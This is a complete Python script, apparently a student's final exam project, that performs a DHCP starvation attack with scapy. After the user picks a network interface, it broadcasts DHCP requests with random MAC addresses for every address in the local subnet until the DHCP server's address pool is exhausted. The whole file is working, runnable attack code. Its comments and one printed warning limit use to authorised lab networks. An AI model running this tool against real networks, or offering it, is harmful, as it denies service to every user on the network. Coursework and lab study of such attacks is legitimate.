#!/usr/bin/python3
import netifaces
import ipaddress
from ipaddress import IPv4Network
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, RandMAC, conf
from time import sleep
import getmac
import os
#autore: Andrea Abbà
#Progetto Esame Finale Python
#docente: Massimo Papa 
#cosa fa il programma? un attacco di tipo DHCP starvation, stampa le interfacce di rete, una volta che ne hai selezionata una inzia l'attacco utilizzando quella rete
#disclaimer: questo programma andrebbe utilizzato solamente in ambienti controllati e autorizzati o in laboratori a scopo didattico, non mi prendo nessuna resposabilità qualsasi cosa accada
#alla vostra rete

def sudomod():
    """controllo se il programma è stato lanciato con sudo o no"""
    if not 'SUDO_UID' in os.environ.keys():
        print("per usare questo programma devi usare il comando sudo")
        exit()

def stampainfo(scelta):
    """stampa informazioni sull'interfaccia di rete"""
    print("\nMAC: ",getmac.get_mac_address(scelta)) #stampa del mac address 
    print("Indirizzo IP: ", netifaces.ifaddresses(scelta)[netifaces.AF_INET][0]['addr']) #stampa indrizzo ip 
    print("Mask: ", netifaces.ifaddresses(scelta)[netifaces.AF_INET][0]['netmask']) #stampa maschera di rete
    print("Gateway: ", netifaces.gateways()['default'][netifaces.AF_INET][0]) #stampa Gateway della rete
    netmask = netifaces.ifaddresses(scelta)[netifaces.AF_INET][0]['netmask'] 
    cidr = sum(bin(int(j)).count('1') for j in netmask.split('.')) #calcolo del CIDR per la mask
    print("CIDR Length: ", cidr) #stampa lunghezza denominazione CIDR
    print("Full IP Address: ", str(netifaces.ifaddresses(scelta)[netifaces.AF_INET][0]['addr']) + '/' + str(cidr)) #stampa dell'ip assieme al CIDR
    rete = str(netifaces.ifaddresses(scelta)[netifaces.AF_INET][0]['addr']) + '/' + str(netifaces.ifaddresses(scelta)[netifaces.AF_INET][0]['netmask']) # calcolo della rete, utile per funzione successiva
    return rete 


def stampainter():
    """stampa di tutte le interfacce di rete utilizzabili (loopback esclusa)"""
    for i in netifaces.interfaces(): #per ogni interfaccia di rete stampo il relativo indirizzo ip, maschera e gateway
        try: 
            if (netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'] != '127.0.0.1'): #escludo la loopback dalle interfacce di rete
                print("\ninterfaccia ",i,":") #stampo il nome dell'interfaccia 
                print(stampainfo(i)) #stampo le relative informazioni
        except:pass

def Verbose():
    """menù che chiede le informazioni per ogni pacchetto"""
    verbose = True
    while verbose: #menù per chiedere all'utente le informazioni sul pacchetto
       stampa = input("vuoi le informazioni scritte per ogni pacchetto inviato? [y/n]: ")
       if stampa == 'y':
           print("hai abilitato l'output verboso!\n")
           verbose = False
           break
       if stampa == 'n':
           print("non hai abilitato l'output verboso\n")
           verbose = False
       else:
            print("errore nella scelta, riprova")
    return stampa

def Starvation(rete, scelta):
    """uso interfaccia di rete scelta dall'utente per fare le richieste al server DHCP """
    stampa = Verbose()
    conf.checkIPaddr = False
    possible_ips = [str(ip) for ip in ipaddress.IPv4Network(rete, strict=False)] #imposto gli ip possibili come tutti quelli nella sottorete 
    for ip_add in possible_ips: #ciclo per inviare i pacchetti associati a ogni ip
     randmac = RandMAC() #creazione mac random 
     broadcast = Ether(src=getmac.get_mac_address(scelta), dst="ff:ff:ff:ff:ff:ff") #invio pacchetto broadcast nella rete
     ip = IP(src="0.0.0.0", dst="255.255.255.255")
     udp = UDP(sport=68, dport=67) #imposto porta di destinazione e origine 
     bootp = BOOTP(op=1, chaddr =  randmac) #imposto il protocollo bootp a 1 e come indrizzo vado a mettere l'indrizzo mac random
     #in dhcp definisco le specifiche del pacchettom, quindi il tipo di richiesta, l'ip scelto, l'ip del server dhcp
     dhcp = DHCP(options=[("message-type", "request"),("requested_addr", ip_add), ("server_id", netifaces.gateways()['default'][netifaces.AF_INET][0]), ('end')]) 
     pkt = broadcast / ip / udp / bootp / dhcp #creazione del pacchetto
     sendp(pkt,iface=scelta, verbose=0) #invio del pacchetto attraverso l'interfaccia scelta
     sleep(0.3) #imposto sleep per evitare sovraccarichi 
     if stampa == 'y':
         print(f"Invio pacchetto di richiesta DCHP con iP: {ip_add}, MAC: {randmac}") #stampo informazioni dei pacchetti singoli

def main():
    sudomod()
    print("\nattenzione, questo programma va usato solo in ambienti di laboratorio / autorizzati\n")
    iface = True
    print("Scegli una delle seguenti interfacce di rete: ")
    stampainter() #stampa interfacce disponibili
    while iface:
        scelta = input("\nscrivi il nome dell'interfaccia(non usare lo): ")
        if scelta in netifaces.interfaces() and (netifaces.ifaddresses(scelta)[netifaces.AF_INET][0]['addr'] != '127.0.0.1'):
            print("perfetto hai selezionato l'interfaccia:", scelta)
            iface = False
        else:
            print("errore, scrivi bene il nome dell'interfaccia")
    rete = stampainfo(scelta)
    print(rete)
    print("\nfarò dunque partire l'attacco con le seguenti informazioni")
    Starvation(rete, scelta)
    print("\nl'attacco è stato effettuato con successo")

if __name__ == '__main__': main()
